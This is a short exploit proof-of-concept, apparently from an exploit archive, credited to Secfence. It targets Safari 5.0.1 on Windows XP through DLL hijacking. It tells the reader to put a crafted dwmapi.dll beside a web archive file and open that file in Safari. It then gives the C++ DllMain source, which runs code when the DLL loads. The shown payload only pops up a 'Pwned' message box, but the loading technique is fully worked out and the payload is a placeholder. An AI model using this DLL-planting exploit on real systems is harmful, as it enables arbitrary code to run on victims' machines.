/*Version: Safari 5.0.1
Tested on: Windows XP SP3
Author : Secfence

Exploit By:
Vinay Katoch,
Secfence Technologies
www.secfence.com
http://twitter.com/secfence

Place a .htm .mht .mhtml .xht .xhtm .xhtl file and dwmapi.dll in same folder
and run file in safari.

Code for dwmapi.dll:

----------*/

/* wintab32.cpp */

#include "stdafx.h"
#include "dragon.h"

void init() {
MessageBox(NULL,"Pwned", "Pwned!",0x00000003);
}


BOOL APIENTRY DllMain( HANDLE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
{
case DLL_PROCESS_ATTACH:
init();break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DETACH:
break;
    }
    return TRUE;
}

